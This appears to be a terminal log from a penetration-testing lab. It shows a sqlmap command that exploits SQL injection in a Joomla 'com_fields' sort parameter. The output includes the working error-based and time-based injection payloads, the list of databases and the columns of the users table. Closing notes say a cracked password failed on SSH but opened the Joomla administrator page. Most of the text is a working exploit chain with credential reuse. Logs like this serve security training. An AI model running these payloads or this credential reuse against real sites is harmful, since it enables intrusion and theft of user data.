+┌──(kali㉿kali)-[~]
+└─$ sqlmap -u "http://10.10.151.132/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomla -T "#__users" --columns
+        ___
+       __H__                                                                                                                                          
+ ___ ___["]_____ ___ ___  {1.9.2#stable}                                                                                                              
+|_ -| . [)]     | .'| . |                                                                                                                             
+|___|_  [)]_|_|_|__,|  _|                                                                                                                             
+      |_|V...       |_|   https://sqlmap.org                                                                                                          
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 16:25:04 /2025-04-25/
+
+[16:25:04] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.11 Safari/535.19' from file '/usr/share/sqlmap/data/txt/user-agents.txt'                                                              
+[16:25:04] [INFO] testing connection to the target URL
+[16:25:08] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
+you have not declared cookie(s), while server wants to set its own ('eaa83fe8b963ab08ce9ab7d4a798de05=t7vvcpp79q5...vd8i2jqsu4'). Do you want to use those [Y/n] y
+[16:25:10] [INFO] checking if the target is protected by some kind of WAF/IPS
+[16:25:11] [INFO] testing if the target URL content is stable
+[16:25:11] [INFO] target URL content is stable
+[16:25:11] [INFO] heuristic (basic) test shows that GET parameter 'list[fullordering]' might be injectable (possible DBMS: 'MySQL')
+[16:25:11] [INFO] testing for SQL injection on GET parameter 'list[fullordering]'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+[16:25:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[16:25:13] [WARNING] reflective value(s) found and filtering out
+[16:25:34] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[16:25:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[16:26:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[16:27:32] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[16:28:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
+[16:29:39] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
+[16:29:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
+[16:30:04] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[16:30:04] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
+[16:30:05] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
+[16:30:05] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
+[16:30:06] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
+[16:30:06] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
+[16:31:03] [INFO] testing 'Generic inline queries'
+[16:31:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[16:31:48] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[16:32:29] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
+[16:33:13] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[16:34:31] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[16:35:05] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[16:36:20] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
+[16:37:45] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
+[16:38:58] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[16:40:24] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[16:42:03] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
+[16:42:05] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
+[16:42:07] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
+[16:42:09] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
+[16:42:12] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
+[16:42:14] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
+[16:42:16] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
+[16:42:20] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
+[16:42:24] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
+[16:42:24] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
+[16:42:24] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
+[16:43:18] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
+[16:43:18] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[16:44:13] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[16:44:53] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[16:45:13] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[16:46:09] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[16:47:05] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[16:48:02] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[16:48:57] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[16:49:52] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[16:50:48] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[16:51:44] [INFO] testing 'MySQL >= 5.0 (inline) error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[16:51:46] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[16:52:41] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[16:53:36] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[16:54:32] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[16:54:57] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[16:55:33] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
+[16:56:28] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
+[16:56:55] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[16:57:33] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
+[16:57:34] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
+[16:57:35] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
+[16:57:36] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
+[16:57:37] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[16:57:38] [INFO] GET parameter 'list[fullordering]' is 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)' injectable 
+[16:57:38] [INFO] testing 'MySQL inline queries'
+[16:57:39] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[16:57:40] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[16:57:42] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[16:57:43] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[16:57:44] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[16:57:45] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[16:57:46] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[16:57:47] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
+[16:57:48] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
+[16:57:49] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
+[16:57:50] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
+[16:57:51] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
+[16:57:52] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
+[16:57:53] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
+[16:57:54] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
+[16:57:55] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
+[16:57:56] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)'
+[16:57:57] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query)'
+[16:57:58] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)'
+[16:57:59] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query - comment)'
+[16:58:00] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)'
+[16:58:01] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query - comment)'
+[16:58:03] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
+[16:58:04] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
+[16:58:05] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
+[16:58:06] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
+[16:58:07] [INFO] testing 'MySQL AND time-based blind (ELT)'
+[16:58:08] [INFO] testing 'MySQL OR time-based blind (ELT)'
+[16:58:09] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
+[16:58:10] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
+[16:58:11] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[16:58:12] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[16:58:13] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
+[16:58:14] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
+[16:58:27] [INFO] GET parameter 'list[fullordering]' appears to be 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)' injectable 
+[16:58:27] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[16:58:27] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[16:58:49] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
+[16:59:11] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
+[16:59:31] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
+[16:59:50] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
+[16:59:53] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
+[16:59:58] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
+[17:00:04] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
+[17:00:25] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
+[17:00:46] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
+[17:01:06] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+[17:01:29] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
+[17:01:50] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
+[17:02:12] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
+[17:02:32] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
+[17:02:53] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
+[17:03:14] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
+[17:03:34] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
+[17:03:55] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
+[17:04:15] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
+GET parameter 'list[fullordering]' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
+sqlmap identified the following injection point(s) with a total of 2746 HTTP(s) requests:
+---
+Parameter: list[fullordering] (GET)
+    Type: error-based
+    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 2528 FROM(SELECT COUNT(*),CONCAT(0x717a766271,(SELECT (ELT(2528=2528,1))),0x716a6b6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 4741 FROM (SELECT(SLEEP(5)))gIGU)
+---
+[18:14:46] [INFO] the back-end DBMS is MySQL
+[18:14:46] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
+web server operating system: Linux CentOS 7
+web application technology: PHP 5.6.40, Apache 2.4.6
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[18:14:48] [INFO] fetching database names
+[18:14:48] [INFO] retrieved: 'information_schema'
+[18:14:48] [INFO] retrieved: 'joomla'
+[18:14:48] [INFO] retrieved: 'mysql'
+[18:14:49] [INFO] retrieved: 'performance_schema'
+[18:14:49] [INFO] retrieved: 'test'
+available databases [5]:
+[*] information_schema
+[*] joomla
+[*] mysql
+[*] performance_schema
+[*] test
+
+[18:14:49] [INFO] fetching columns for table '#__users' in database 'joomla'
+[18:14:49] [WARNING] unable to retrieve column names for table '#__users' in database 'joomla'
+do you want to use common column existence check? [y/N/q] y
+[18:14:52] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+which common columns (wordlist) file do you want to use?
+[1] default '/usr/share/sqlmap/data/txt/common-columns.txt' (press Enter)
+[2] custom
+> 1
+[18:14:56] [INFO] checking column existence using items from '/usr/share/sqlmap/data/txt/common-columns.txt'
+[18:14:56] [INFO] adding words used on web page to the check list
+please enter number of threads? [Enter for 1 (current)] 
+
+[18:15:00] [WARNING] running in a single-thread mode. This could take a while
+[18:15:00] [INFO] retrieved: id                                                                                                                      
+[18:15:00] [INFO] retrieved: name                                                                                                                    
+[18:15:01] [INFO] retrieved: username                                                                                                                
+[18:15:04] [INFO] retrieved: email                                                                                                                   
+[18:15:36] [INFO] retrieved: password                                                                                                                
+[18:21:56] [INFO] retrieved: params                                                                                                                  
+ 
+Database: joomla
+Table: joomla.#__users
+[6 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| name     | non-numeric |
+| email    | non-numeric |
+| id       | numeric     |
+| params   | numeric     |
+| password | non-numeric |
+| username | non-numeric |
++----------+-------------+
+
+so safe to say I used the spiderman123 password we cracked on ssh logins to no avail (not for any of the accounts did spiderman123 work)
+
+jonah
+spiderman123 DID work for the 10. 10.116.31/administrator page though
